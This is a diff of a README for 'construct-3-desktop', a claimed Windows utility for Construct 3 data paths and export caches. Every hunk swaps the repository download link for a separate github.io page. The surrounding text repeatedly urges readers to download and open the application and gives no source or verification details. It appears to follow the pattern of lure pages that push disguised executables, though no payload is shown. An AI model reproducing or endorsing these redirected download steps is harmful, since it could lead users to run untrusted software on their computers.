@@ -1,6 +1,6 @@
 # 🛠️ construct-3-desktop - Manage Construct 3 Data Paths Easily
 
-[![Download construct-3-desktop](https://img.shields.io/badge/Download-construct--3--desktop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cona2512/construct-3-desktop)
+[![Download construct-3-desktop](https://img.shields.io/badge/Download-construct--3--desktop-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://cona2512.github.io)
 
 ## 🚀 Overview
 
@@ -10,7 +10,7 @@ Many Construct 3 users work with local projects, exported files, and temporary d
 
 The main download page is here:
 
-[Visit this link to download the application](https://github.com/Cona2512/construct-3-desktop)
+[Visit this link to download the application](https://cona2512.github.io)
 
 ## ✨ What construct-3-desktop Helps With
 
@@ -27,7 +27,7 @@ These areas are often hidden from normal view. construct-3-desktop makes them ea
 
 Use the main project page to get the application.
 
-1. Open this link: [Download construct-3-desktop](https://github.com/Cona2512/construct-3-desktop).
+1. Open this link: [Download construct-3-desktop](https://cona2512.github.io).
 2. Visit this link to download the application.
 3. After the download completes, open the application on your Windows computer.
 4. Use the application to view and manage Construct 3 data paths, configuration settings, export caches, and export folders.
@@ -85,7 +85,7 @@ For Windows users, the main action is simple: visit the download page, get the a
 
 If the download page does not open, copy the link into your browser address bar:
 
-[Visit this link to download the application](https://github.com/Cona2512/construct-3-desktop)
+[Visit this link to download the application](https://cona2512.github.io)
 
 If the application does not open after download, check that the download completed fully. Then open the downloaded item again from your Downloads folder. If you moved the file after downloading, return to the folder where you saved it and open it from there.
 
@@ -103,7 +103,7 @@ Keep the project page bookmarked so you can return to it when you need the appli
 
 Return to the project page whenever you need the application:
 
-[Download construct-3-desktop](https://github.com/Cona2512/construct-3-desktop)
+[Download construct-3-desktop](https://cona2512.github.io)
 
 Visit this link to download the application. After the download completes, open the application and use it to manage Construct 3 data paths, configuration settings, export caches, and export folders on your Windows computer.
 
